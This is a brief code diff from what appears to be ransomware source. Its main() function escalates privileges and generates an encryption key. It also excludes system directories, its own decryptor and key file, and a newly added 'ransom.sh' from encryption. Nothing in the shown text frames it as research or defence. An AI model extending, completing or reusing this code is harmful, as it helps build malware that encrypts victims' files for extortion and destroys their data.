@@ -73,7 +73,7 @@ def main():
     setup_logging()
     elevate_privileges_if_needed()
     key = generate_encryption_key()
-    exclude_paths = set(["main.py", "encryption.key", "decrypt.py"])
+    exclude_paths = set(["main.py", "encryption.key", "decrypt.py", "ransom.sh"])
     system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys"]
     exclude_paths.update(system_paths)
     signal.signal(signal.SIGBUS, handle_bus_error)
